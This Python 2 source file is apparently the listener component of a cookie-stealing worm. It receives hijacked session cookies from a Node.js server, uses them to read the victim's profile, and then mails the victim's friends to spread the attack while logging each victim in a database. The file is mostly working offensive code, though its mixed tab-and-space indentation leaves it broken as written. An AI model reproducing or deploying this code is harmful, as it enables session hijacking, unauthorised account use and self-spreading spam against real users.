#-*- coding:utf-8 -*-

# @author:0xcc
# @functionality:
# this file is intended for creating a socket 
# listening from nodejs Server's socket client.
# When there's responding , we launch our attaka with testRequests.py

import socket
import logs
import parseCookie
import UserInfo
import testRequests
import param
import Util
import AutoAttaka
import urllib

class Listener:
    
    #necessary Parameters here
    HOST        = ""
    PORT        = 0
    Flag        = ""
    socket      = None
    
    def __init__(self, HOST, PORT):
        
        self.HOST = HOST
        self.PORT = PORT
        self.socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.HOST,self.PORT))
        self.socket.listen(10)
        print "[*] Node-Py Socket Starting socket listening.."
        while 1:
            
            conn,addr = self.socket.accept()
            
            ##Cookie length should not be longer than this.
	        while 1:	            
            	data        = conn.recv(4096)
            	data 		= str(data)
	    	    print data
	    	    data 		= urllib.unquote(data)
            	cookies             = parseCookie.parseCookie(data)
            	Request             = testRequests.LaunchRequest(cookies)
            	userInfoCollection  = Util.parsehtml.parse(Request.send(param.userProfile_url, None, "get",1))
            	Username            = userInfoCollection['userName']
		        logs.LOG.WriteLog("[*]Attacking " + Username)
            
            #Start Sweep process after Getting Cookie
            #Right now.
            #If somebody's cookie is up
            #it assures it's his first
            #time of visiting, but be careful
            #of two complete clicking
            
            	AutoAttaka.AutoAttaka.establishSender(cookies)
            	hisList = AutoAttaka.AutoAttaka.acquireHisList()
                #Start Emailing to friends and Recommend
            	for him in hisList:
                    
                    if UserInfo.dbopt.checkExistence(him) == 0:
                        
                        #Non-Exist, launch attaka.
                    	AutoAttaka.AutoAttaka.Mail(him)
                    	UserInfo.dbopt.addVisited(him)
            	AutoAttaka.AutoAttaka.cleanMail()    
            
            	UserInfo.dbopt.addVisited(Username)
            	UserInfo.dbopt.saveUserInfo(userInfoCollection)
            
            
            #Once get value from node-server,
            #launch attack with Util.py
            #Test-finish at 00:09.
            

if __name__ == '__main__':
    
    logger1 = logs.LOG(param.logpath, "Runtime.log")
    logger2 = logs.LOG(param.logpath, "Info.log")
    Listen = Listener("127.0.0.1", 7777)
    
    
